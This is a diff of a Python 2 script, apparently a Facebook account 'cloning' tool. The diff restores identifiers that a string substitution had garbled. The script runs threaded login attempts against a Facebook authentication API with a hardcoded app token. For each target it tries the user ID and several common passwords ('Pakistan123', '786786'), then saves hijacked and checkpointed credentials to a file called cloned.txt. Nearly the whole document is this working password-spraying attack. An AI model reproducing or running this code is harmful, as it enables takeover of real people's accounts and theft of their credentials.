@@ -1,6 +1,6 @@
  # Ustad# SIDRA5# Thuglife# Majidyar# Gamz#!/usr/bin/python2
 #coding=utf-8
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,coN4D33M-OKielib,getpass
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
 for n in range(10000):
 
@@ -24,7 +24,7 @@ except ImportError:
     time.sleep(1)
     os.system('Then type: python2 boss')
 
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,coN4D33M-OKielib,requests,mechanize
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from mechanize import Browser
@@ -36,7 +36,7 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.faceboN4D33M-OK.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
 def keluar():
 	print 'Thanks.'
@@ -72,9 +72,9 @@ def tik():
 
 
 back = 0
-N4D33M-OKs = []
+oks = []
 id = []
-N4D33M-CPb = []
+cpb = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
@@ -194,7 +194,7 @@ def action():
     jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
     print 50* '\033[1;97m-'
     def main(arg):
-        global N4D33M-CPb,N4D33M-OKs
+        global cpb,oks
         user = arg
         try:
             os.mkdir('save')
@@ -202,89 +202,89 @@ def action():
             pass
         try:
             pass1 = user
-            data = br.open('https://b-api.faceboN4D33M-OK.com/method/auth.login?access_tN4D33M-OKen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_coN4D33M-OKies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
-            if 'access_tN4D33M-OKen' in q:
-                print '\x1b[1;95m(N4D33M-CP)  ' + k + c + user + '  |  ' + pass1                                       
-                N4D33M-OKb = open('save/cloned.txt', 'a')
-                N4D33M-OKb.write(k+c+user+pass1+'\n')
-                N4D33M-OKb.close()
-                N4D33M-OKs.append(c+user+pass1)
+            if 'access_token' in q:
+                print '\x1b[1;95m(CP)  ' + k + c + user + '  |  ' + pass1                                       
+                okb = open('save/cloned.txt', 'a')
+                okb.write(k+c+user+pass1+'\n')
+                okb.close()
+                oks.append(c+user+pass1)
             else:
-                if 'www.faceboN4D33M-OK.com' in q['error_msg']:
-                    print '\033[1;97m(\x1b[1;95mN4D33M-CP) ' + k + c + user + '  |  ' + pass1
-                    N4D33M-CPs = open('save/cloned.txt', 'a')
-                    N4D33M-CPs.write(k+c+user+pass1+'\n')
-                    N4D33M-CPs.close()
-                    N4D33M-CPb.append(c+user+pass1)
+                if 'www.facebook.com' in q['error_msg']:
+                    print '\033[1;97m(\x1b[1;95mCP) ' + k + c + user + '  |  ' + pass1
+                    cps = open('save/cloned.txt', 'a')
+                    cps.write(k+c+user+pass1+'\n')
+                    cps.close()
+                    cpb.append(c+user+pass1)
                 else:
                     pass2 = k + c + user
-                    data = br.open('https://b-api.faceboN4D33M-OK.com/method/auth.login?access_tN4D33M-OKen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_coN4D33M-OKies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
-                    if 'access_tN4D33M-OKen' in q:
-                        print '\x1b[1;91m(N4D33M-OK)  ' + k + c + user +  '  |  ' + pass2
-                        N4D33M-OKb = open('save/cloned.txt', 'a')
-                        N4D33M-OKb.write(k+c+user+pass2+'\n')
-                        N4D33M-OKb.close()
-                        N4D33M-OKs.append(c+user+pass2)
+                    if 'access_token' in q:
+                        print '\x1b[1;91m(OK)  ' + k + c + user +  '  |  ' + pass2
+                        okb = open('save/cloned.txt', 'a')
+                        okb.write(k+c+user+pass2+'\n')
+                        okb.close()
+                        oks.append(c+user+pass2)
                     else:
-                        if 'www.faceboN4D33M-OK.com' in q['error_msg']:
-                            print '\033[1;97m(\x1b[1;93mN4D33M-CP) ' + k + c + user + '  |  ' + pass2
-                            N4D33M-CPs = open('save/cloned.txt', 'a')
-                            N4D33M-CPs.write(k+c+user+pass2+'\n')
-                            N4D33M-CPs.close()
-                            N4D33M-CPb.append(c+user+pass2)
+                        if 'www.facebook.com' in q['error_msg']:
+                            print '\033[1;97m(\x1b[1;93mCP) ' + k + c + user + '  |  ' + pass2
+                            cps = open('save/cloned.txt', 'a')
+                            cps.write(k+c+user+pass2+'\n')
+                            cps.close()
+                            cpb.append(c+user+pass2)
                         else:
                             pass3="Pakistan123"
-                            data = br.open('https://b-api.faceboN4D33M-OK.com/method/auth.login?access_tN4D33M-OKen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_coN4D33M-OKies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
-                            if 'access_tN4D33M-OKen' in q:
-                                print '\x1b[1;93m(N4D33M-OK)  ' + k + c + user + '  |  ' + pass3
-                                N4D33M-OKb = open('save/cloned.txt', 'a')
-                                N4D33M-OKb.write(k+c+user+pass3+'\n')
-                                N4D33M-OKb.close()
-                                N4D33M-OKs.append(c+user+pass3)
+                            if 'access_token' in q:
+                                print '\x1b[1;93m(OK)  ' + k + c + user + '  |  ' + pass3
+                                okb = open('save/cloned.txt', 'a')
+                                okb.write(k+c+user+pass3+'\n')
+                                okb.close()
+                                oks.append(c+user+pass3)
                             else:
-                                if 'www.faceboN4D33M-OK.com' in q['error_msg']:
-                                    print '\033[1;97m(\x1b[1;93mN4D33M-CP) ' + k + c + user + '  |  ' + pass3 
-                                    N4D33M-CPs = open('save/cloned.txt', 'a')
-                                    N4D33M-CPs.write(k+c+user+pass3+'\n')
-                                    N4D33M-CPs.close()
-                                    N4D33M-CPb.append(c+user+pass3)
+                                if 'www.facebook.com' in q['error_msg']:
+                                    print '\033[1;97m(\x1b[1;93mcp) ' + k + c + user + '  |  ' + pass3 
+                                    cps = open('save/cloned.txt', 'a')
+                                    cps.write(k+c+user+pass3+'\n')
+                                    cps.close()
+                                    cpb.append(c+user+pass3)
                                 else:
                                     pass4="000786"
-                                    data = br.open('https://b-api.faceboN4D33M-OK.com/method/auth.login?access_tN4D33M-OKen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_coN4D33M-OKies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
-                                    if 'access_tN4D33M-OKen' in q:
-                                        print '\x1b[1;93m(N4D33M-OK)  ' + k + c + user + '  |  ' + pass4 
-                                        N4D33M-OKb = open('save/cloned.txt', 'a')
-                                        N4D33M-OKb.write(k+c+user+pass4+'\n')
-                                        N4D33M-OKb.close()
-                                        N4D33M-OKs.append(c+user+pass4)
+                                    if 'access_token' in q:
+                                        print '\x1b[1;93m(OK)  ' + k + c + user + '  |  ' + pass4 
+                                        okb = open('save/cloned.txt', 'a')
+                                        okb.write(k+c+user+pass4+'\n')
+                                        okb.close()
+                                        oks.append(c+user+pass4)
                                     else:
-                                        if 'www.faceboN4D33M-OK.com' in q['error_msg']:
-                                            print '\033[1;97m\x1b[1;93m(N4D33M-CP) ' + k + c + user + '  |  ' + pass4
-                                            N4D33M-CPs = open('save/cloned.txt', 'a')
-                                            N4D33M-CPs.write(k+c+user+pass4+'\n')
-                                            N4D33M-CPs.close()
-                                            N4D33M-CPb.append(c+user+pass4)
+                                        if 'www.facebook.com' in q['error_msg']:
+                                            print '\033[1;97m\x1b[1;93m(CP) ' + k + c + user + '  |  ' + pass4
+                                            cps = open('save/cloned.txt', 'a')
+                                            cps.write(k+c+user+pass4+'\n')
+                                            cps.close()
+                                            cpb.append(c+user+pass4)
                                         else:
                                             pass5="786786"
-                                            data = br.open('https://b-api.faceboN4D33M-OK.com/method/auth.login?access_tN4D33M-OKen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_coN4D33M-OKies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
-                                            if 'access_tN4D33M-OKen' in q:
-                                                print '\x1b[1;93m(N4D33M-OK)  ' + k + c + user + '  |  ' + pass5
-                                                N4D33M-OKb = open('save/cloned.txt', 'a')
-                                                N4D33M-OKb.write(k+c+user+pass5+'\n')
-                                                N4D33M-OKb.close()
-                                                N4D33M-OKs.append(c+user+pass5)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;93m(OK)  ' + k + c + user + '  |  ' + pass5
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass5+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass5)
                                             else:
-                                                if 'www.faceboN4D33M-OK.com' in q['error_msg']:
-                                                    print '\033[1;97m\x1b[1;94m(N4D33M-CP) ' + k + c + user + '  |  ' + pass5 
-                                                    N4D33M-CPs = open('save/cloned.txt', 'a')
-                                                    N4D33M-CPs.write(k+c+user+pass5+'\n')
-                                                    N4D33M-CPs.close()
-                                                    N4D33M-CPb.append(c+user+pass5)
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m\x1b[1;94m(CP) ' + k + c + user + '  |  ' + pass5 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass5+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                 
                                                                                                                                                                                                                 
                                                                                                                                                                                                             
@@ -307,7 +307,7 @@ def action():
     p.map(main, id)
     print 50* '\033[1;91m-'
     print 'Process Has Been Completed ...'
-    print 'Total Online/Offline : '+str(len(N4D33M-OKs))+'/'+str(len(N4D33M-CPb))
+    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
     print('Cloned Accounts Has Been Saved : save/cloned.txt')
     jalan("Note : Your Offline account Will Open after 8 to 10 days")
     print ''
